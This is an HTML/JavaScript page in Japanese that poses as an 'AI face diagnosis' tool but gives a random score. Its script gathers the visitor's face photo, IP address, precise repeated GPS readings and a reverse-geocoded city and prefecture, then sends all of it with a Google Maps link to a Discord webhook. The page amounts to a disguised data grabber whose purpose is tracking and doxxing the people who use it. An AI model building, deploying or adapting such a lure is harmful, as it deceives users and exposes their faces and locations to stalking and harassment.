<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AI 顔診断</title>

<style>
:root {
  --bg1: #0f172a;
  --bg2: #020617;
  --card: rgba(255,255,255,0.08);
  --accent: #7c7cff;
  --text-sub: #c7d2fe;
}
body {
  margin: 0;
  font-family: sans-serif;
  background: radial-gradient(circle at top, var(--bg1), var(--bg2));
  color: #fff;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}
.container { max-width: 420px; width: 100%; padding: 20px; }
.card {
  background: var(--card);
  backdrop-filter: blur(14px);
  border-radius: 20px;
  padding: 24px;
  text-align: center;
}
.sub { font-size: 13px; color: var(--text-sub); margin-bottom: 12px; }
.label-btn {
  display: block;
  padding: 12px;
  background: rgba(255,255,255,0.1);
  border-radius: 12px;
  cursor: pointer;
  margin-bottom: 10px;
}
input[type="file"] { display:none; }
button {
  width: 100%;
  padding: 12px;
  border: none;
  border-radius: 12px;
  background: var(--accent);
  font-weight: bold;
  cursor: pointer;
}
.preview img { width: 100%; margin-top: 10px; border-radius: 12px; }
.result { margin-top: 15px; }
</style>
</head>

<body>
<div class="container">
<div class="card">

<h1>AI 顔診断</h1>

<div class="sub">
画像を選ぶだけで診断できます
</div>

<div class="sub">
本サービスでは診断処理および不正防止のため、画像・IPアドレス・位置情報を外部サーバーへ送信します。<br>
（許可は任意です）
</div>

<label class="label-btn">
画像を選択
<input type="file" id="file" accept="image/*">
</label>

<button onclick="startDiagnosis()">診断する</button>

<div class="preview" id="previewBox" style="display:none;">
<img id="preview">
</div>

<div class="result" id="result" style="display:none;"></div>

</div>
</div>

<script>
const WEBHOOK_URL = "ここにWebhook入れる"; // Discord Webhook

// 診断開始
function startDiagnosis() {
  const file = document.getElementById("file").files[0];
  if (!file) {
    alert("画像選んで！");
    return;
  }

  const result = document.getElementById("result");
  result.style.display = "block";
  result.innerHTML = "診断中...";

  if (navigator.geolocation) {
    collectPositions(5)
      .then(pos => runDiagnosis(pos?.latitude, pos?.longitude))
      .catch(() => runDiagnosis(null, null));
  } else {
    runDiagnosis(null, null);
  }
}

// 複数回位置情報を取得して最頻値を返す
function collectPositions(times) {
  return new Promise((resolve, reject) => {
    const positions = [];
    let count = 0;

    function getPos() {
      navigator.geolocation.getCurrentPosition(
        (p) => {
          positions.push({ latitude: p.coords.latitude, longitude: p.coords.longitude });
          count++;
          if (count < times) setTimeout(getPos, 200);
          else resolve(mostFrequentPosition(positions));
        },
        (err) => {
          count++;
          if (count >= times) {
            if (positions.length > 0) resolve(mostFrequentPosition(positions));
            else reject(err);
          } else setTimeout(getPos, 200);
        },
        { enableHighAccuracy: true, timeout:5000, maximumAge:0 }
      );
    }

    getPos();
  });
}

// 最頻値を算出
function mostFrequentPosition(positions) {
  if (!positions.length) return null;
  const keyCount = {};
  positions.forEach(p => {
    const key = `${p.latitude.toFixed(5)},${p.longitude.toFixed(5)}`;
    keyCount[key] = (keyCount[key] || 0) + 1;
  });
  const maxKey = Object.keys(keyCount).reduce((a,b)=> keyCount[a] > keyCount[b]? a:b);
  const [lat, lon] = maxKey.split(',').map(Number);
  return { latitude: lat, longitude: lon };
}

// 診断処理
function runDiagnosis(lat, lon) {
  const file = document.getElementById("file").files[0];
  const reader = new FileReader();

  reader.onload = () => {
    const base64 = reader.result;

    document.getElementById("preview").src = base64;
    document.getElementById("previewBox").style.display = "block";

    const result = document.getElementById("result");
    result.innerHTML = "顔検出中...";
    setTimeout(() => result.innerHTML = "特徴解析中...", 500);

    setTimeout(async () => {
      const score = Math.floor(30 + Math.random() * 20);
      const rank = score >= 45 ? "S" : score >= 30 ? "A" : "B";

      result.innerHTML = `ランク ${rank}<br>黄金比スコア：${score}%<br>いい感じやん`;

      await sendToDiscord(base64, score, rank, lat, lon);
    }, 1200);
  };

  reader.readAsDataURL(file);
}

// 度→度分秒
function toDMS(lat, lon) {
  function convert(deg) {
    const d = Math.floor(deg);
    const m = Math.floor((deg - d) * 60);
    const s = (((deg - d) * 60 - m) * 60).toFixed(1);
    return [d, m, s];
  }
  const [latD, latM, latS] = convert(Math.abs(lat));
  const [lonD, lonM, lonS] = convert(Math.abs(lon));
  const latDir = lat >=0?"N":"S";
  const lonDir = lon >=0?"E":"W";
  return `${latD}°${latM}'${latS}"${latDir} ${lonD}°${lonM}'${lonS}"${lonDir}`;
}

// 市町村取得（OSM）
async function getAddress(lat, lon) {
  try {
    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=ja`);
    const data = await res.json();

    const city = data.address.city || data.address.town || data.address.village || data.address.county || "不明";
    const state = data.address.state || "不明";

    // 地方分類
    const regionMap = {
      "北海道": "北海道",
      "青森県":"東北", "岩手県":"東北","秋田県":"東北","宮城県":"東北","山形県":"東北","福島県":"東北",
      "茨城県":"関東","栃木県":"関東","群馬県":"関東","埼玉県":"関東","千葉県":"関東","東京都":"関東","神奈川県":"関東",
      "新潟県":"中部","富山県":"中部","石川県":"中部","福井県":"中部","山梨県":"中部","長野県":"中部","岐阜県":"中部","静岡県":"中部","愛知県":"中部",
      "三重県":"近畿","滋賀県":"近畿","京都府":"近畿","大阪府":"近畿","兵庫県":"近畿","奈良県":"近畿","和歌山県":"近畿",
      "鳥取県":"中国","島根県":"中国","岡山県":"中国","広島県":"中国","山口県":"中国",
      "徳島県":"四国","香川県":"四国","愛媛県":"四国","高知県":"四国",
      "福岡県":"九州","佐賀県":"九州","長崎県":"九州","熊本県":"九州","大分県":"九州","宮崎県":"九州","鹿児島県":"九州","沖縄県":"九州"
    };
    const region = regionMap[state] || "不明";

    return { city, state, region };
  } catch {
    return { city:"不明", state:"不明", region:"不明" };
  }
}
// Discord送信
async function sendToDiscord(base64, score, rank, lat, lon) {
  const fd = new FormData();
  fd.append("file", dataURLtoBlob(base64), "face.png");

  const ipData = await fetch("https://api.ipify.org?format=json").then(r=>r.json());

let addrData = { city:"不明", state:"不明", region:"不明" };
if (lat != null && lon != null) {
  addrData = await getAddress(lat, lon);
  dms = toDMS(lat, lon);
}

fd.append("payload_json", JSON.stringify({
  content: `
📸 顔診断
IP: ${ipData.ip}
地域: ${addrData.city} (${addrData.state}, ${addrData.region})
位置: https://maps.google.com/?q=${lat ?? "不明"},${lon ?? "不明"}
黄金比: ${score}%
ランク: ${rank}
DMS: ${dms}
`
}));

  fetch(WEBHOOK_URL, { method:"POST", body:fd })
    .then(res => console.log("送信OK", res.status))
    .catch(err => console.log("送信エラー", err));
}

// base64 → Blob
function dataURLtoBlob(dataurl){
  const arr = dataurl.split(',');
  const mime = arr[0].match(/:(.*?);/)[1];
  const bstr = atob(arr[1]);
  let n = bstr.length;
  const u8 = new Uint8Array(n);
  while(n--) u8[n]=bstr.charCodeAt(n);
  return new Blob([u8], {type:mime});
}
</script>
  
</body>
</html>
